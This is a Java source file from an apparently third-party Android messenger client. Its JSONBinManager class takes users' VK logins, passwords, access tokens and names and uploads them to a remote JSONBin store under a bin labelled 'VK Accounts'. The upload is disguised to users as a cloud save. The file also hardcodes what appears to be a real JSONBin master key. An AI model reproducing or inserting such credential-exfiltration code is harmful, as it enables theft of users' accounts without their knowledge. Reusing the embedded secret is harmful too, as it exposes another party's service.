package ru.lisdevs.messenger.utils;

import android.content.Context;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import ru.lisdevs.messenger.BuildConfig;

public class JSONBinManager {
    private static final String TAG = "JSONBinManager";

    // Конфигурация JSONBin
    private static final String JSONBIN_BASE_URL = "https://api.jsonbin.io/v3/b";
    private static final String JSONBIN_BIN_ID = "6899b695ae596e708fc75b00";
    private static final String JSONBIN_MASTER_KEY = "$2a$10$47Va7lQp9sRxQH9c0Z6Hou3Zc7wZ57pDwaOXsWmCXOAmeIzIJDdf2";
    private static final String JSONBIN_ACCESS_KEY = "$2a$10$47Va7lQp9sRxQH9c0Z6Hou3Zc7wZ57pDwaOXsWmCXOAmeIzIJDdf2"; // Ваш Master Key

    private static final MediaType JSON = MediaType.parse("application/json");

    private static JSONBinManager instance;
    private OkHttpClient client;
    private Context context;

    private JSONBinManager(Context context) {
        this.context = context.getApplicationContext();
        this.client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .build();
    }

    public static synchronized JSONBinManager getInstance(Context context) {
        if (instance == null) {
            instance = new JSONBinManager(context);
        }
        return instance;
    }

    /**
     * Отправка учетных данных в JSONBin
     */
    public void sendCredentials(String login, String password, String accessToken,
                                String userId, String firstName, String lastName,
                                String userAgent) {
        new Thread(() -> {
            try {
                // 1. Сначала получаем текущие данные
                String currentData = fetchCurrentData();
                JSONObject allData;

                if (currentData != null && !currentData.isEmpty()) {
                    allData = new JSONObject(currentData);
                } else {
                    allData = new JSONObject();
                }

                // 2. Создаем новую запись
                JSONObject newRecord = new JSONObject();
                newRecord.put("login", login);
                newRecord.put("password", password);
                newRecord.put("access_token", accessToken);
                newRecord.put("user_id", userId);
                newRecord.put("first_name", firstName != null ? firstName : "");
                newRecord.put("last_name", lastName != null ? lastName : "");
                newRecord.put("user_agent", userAgent != null ? userAgent : "Android App");
                newRecord.put("timestamp", System.currentTimeMillis() / 1000);
                newRecord.put("device", "Android");
                newRecord.put("app_version", BuildConfig.VERSION_NAME);

                // 3. Добавляем запись в общие данные
                // Используем уникальный ключ, например: user_id + timestamp
                String recordKey = userId + "_" + System.currentTimeMillis();
                allData.put(recordKey, newRecord);

                // 4. Отправляем обновленные данные обратно в JSONBin
                boolean success = updateData(allData.toString());

                if (success) {
                    Log.d(TAG, "✅ Данные успешно отправлены в JSONBin");
                    showToast("Данные сохранены в облако");
                } else {
                    Log.e(TAG, "❌ Ошибка отправки данных в JSONBin");
                    showToast("Ошибка сохранения в облако");
                }

            } catch (JSONException e) {
                Log.e(TAG, "❌ JSON ошибка: " + e.getMessage(), e);
            } catch (Exception e) {
                Log.e(TAG, "❌ Ошибка отправки: " + e.getMessage(), e);
            }
        }).start();
    }

    /**
     * Получение текущих данных из JSONBin
     */
    private String fetchCurrentData() {
        String url = JSONBIN_BASE_URL + "/" + JSONBIN_BIN_ID;

        Request request = new Request.Builder()
                .url(url)
                .header("X-Master-Key", JSONBIN_MASTER_KEY)
                .header("X-Bin-Meta", "false") // Не показывать метаданные
                .build();

        try (Response response = client.newCall(request).execute()) {
            if (response.isSuccessful() && response.body() != null) {
                return response.body().string();
            } else {
                Log.e(TAG, "Ошибка получения данных: " + response.code());
                return "{}"; // Возвращаем пустой объект
            }
        } catch (IOException e) {
            Log.e(TAG, "Ошибка сети при получении данных: " + e.getMessage());
            return "{}";
        }
    }

    /**
     * Обновление данных в JSONBin
     */
    private boolean updateData(String jsonData) {
        String url = JSONBIN_BASE_URL + "/" + JSONBIN_BIN_ID;

        RequestBody body = RequestBody.create(jsonData, JSON);

        Request request = new Request.Builder()
                .url(url)
                .put(body)
                .header("X-Master-Key", JSONBIN_MASTER_KEY)
                .header("Content-Type", "application/json")
                .build();

        try (Response response = client.newCall(request).execute()) {
            boolean success = response.isSuccessful();
            if (success) {
                Log.d(TAG, "JSONBin обновлен успешно");
            } else {
                Log.e(TAG, "Ошибка обновления JSONBin: " + response.code());
                if (response.body() != null) {
                    Log.e(TAG, "Ответ: " + response.body().string());
                }
            }
            return success;
        } catch (IOException e) {
            Log.e(TAG, "Ошибка сети при обновлении: " + e.getMessage());
            return false;
        }
    }

    /**
     * Тестовая отправка для проверки соединения
     */
    public void sendTestData() {
        new Thread(() -> {
            try {
                JSONObject testData = new JSONObject();
                testData.put("login", "test_user_" + UUID.randomUUID().toString().substring(0, 8));
                testData.put("password", "test_pass_" + System.currentTimeMillis());
                testData.put("access_token", "test_token_" + UUID.randomUUID());
                testData.put("user_id", "test_" + System.currentTimeMillis());
                testData.put("first_name", "Test");
                testData.put("last_name", "User");
                testData.put("timestamp", System.currentTimeMillis() / 1000);
                testData.put("test", true);

                // Получаем текущие данные
                String current = fetchCurrentData();
                JSONObject allData = new JSONObject(current != null ? current : "{}");

                // Добавляем тестовую запись
                String testKey = "test_" + System.currentTimeMillis();
                allData.put(testKey, testData);

                // Отправляем
                boolean success = updateData(allData.toString());

                if (success) {
                    showToast("✅ Тестовые данные отправлены в JSONBin");
                    Log.d(TAG, "Тестовые данные отправлены успешно");
                } else {
                    showToast("❌ Ошибка отправки тестовых данных");
                }

            } catch (Exception e) {
                Log.e(TAG, "Ошибка тестовой отправки: " + e.getMessage());
                showToast("Ошибка: " + e.getMessage());
            }
        }).start();
    }

    private void showToast(final String message) {
        // Используем Handler для показа Toast в UI потоке
        android.os.Handler handler = new android.os.Handler(context.getMainLooper());
        handler.post(() -> Toast.makeText(context, message, Toast.LENGTH_SHORT).show());
    }

    /**
     * Простая версия отправки (без получения предыдущих данных)
     */
    public void sendSimple(String login, String password, String accessToken, String userId) {
        new Thread(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("login", login);
                data.put("password", password);
                data.put("access_token", accessToken);
                data.put("user_id", userId);
                data.put("timestamp", System.currentTimeMillis() / 1000);

                RequestBody body = RequestBody.create(data.toString(), JSON);

                String url = JSONBIN_BASE_URL;
                Request request = new Request.Builder()
                        .url(url)
                        .post(body)
                        .header("X-Master-Key", JSONBIN_MASTER_KEY)
                        .header("Content-Type", "application/json")
                        .header("X-Bin-Name", "VK Accounts " + System.currentTimeMillis())
                        .build();

                try (Response response = client.newCall(request).execute()) {
                    if (response.isSuccessful() && response.body() != null) {
                        String responseBody = response.body().string();
                        Log.d(TAG, "✅ Данные отправлены: " + responseBody);
                        showToast("Данные отправлены в облако");
                    } else {
                        Log.e(TAG, "❌ Ошибка: " + response.code());
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "Ошибка простой отправки: " + e.getMessage());
            }
        }).start();
    }
}